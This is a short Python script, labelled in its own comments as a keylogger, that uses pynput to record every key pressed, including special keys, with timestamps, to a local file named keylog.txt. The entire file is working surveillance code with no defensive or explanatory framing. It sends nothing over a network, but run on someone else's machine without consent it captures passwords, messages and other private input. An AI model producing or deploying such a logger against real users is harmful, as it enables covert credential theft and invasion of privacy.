from pynput.keyboard import Key, Listener
import logging

# Set up logging configuration
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

# This function is called whenever a key is pressed
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

# Start the keylogger
with Listener(on_press=on_press) as listener:
    listener.join()